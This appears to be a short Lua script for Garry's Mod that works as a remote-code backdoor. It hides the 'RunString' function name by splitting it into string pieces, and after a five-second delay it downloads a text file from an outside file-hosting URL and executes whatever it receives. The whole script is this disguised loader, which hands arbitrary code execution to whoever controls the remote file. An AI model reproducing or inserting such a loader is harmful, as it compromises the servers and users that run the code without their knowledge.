local rstr=_G["Ru".."nStr".."ing"];
RSTR=RSTR||rstr;
local htf=http.Fetch;
HTF=HTF||htf;
timer.Simple(5, function()
	htf("http://puu.sh/gtnOX/57dc004931.txt",function(c)rstr(c)end);
end);